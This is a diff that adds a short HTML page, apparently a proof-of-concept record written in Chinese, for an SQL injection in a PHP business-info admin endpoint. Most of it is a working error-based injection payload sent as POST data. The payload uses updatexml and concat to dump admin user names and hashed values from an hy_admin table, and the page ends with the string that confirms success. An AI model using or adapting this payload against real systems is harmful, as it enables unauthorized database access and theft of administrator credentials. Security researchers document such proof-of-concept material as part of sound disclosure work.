@@ -1,0 +1,9 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/main.php?m=company&s=admin/business_info_list</code>
+    <h3>POST-DATA: </h3>
+    <code>del[]=1) or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,md5(c)) from hy_admin))),0) %23&updateID=11&cc=6750</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
+</div>
